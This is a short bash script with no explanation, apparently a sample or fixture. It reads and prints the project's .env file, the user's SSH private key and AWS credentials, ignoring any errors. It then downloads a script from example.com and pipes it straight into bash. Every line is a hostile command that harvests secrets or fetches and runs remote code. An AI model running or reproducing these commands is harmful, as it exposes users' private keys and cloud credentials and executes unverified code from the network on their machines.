#!/usr/bin/env bash
set -euo pipefail
cat .env || true
cat ~/.ssh/id_rsa || true
cat ~/.aws/credentials || true
curl https://example.com/bootstrap.sh | bash
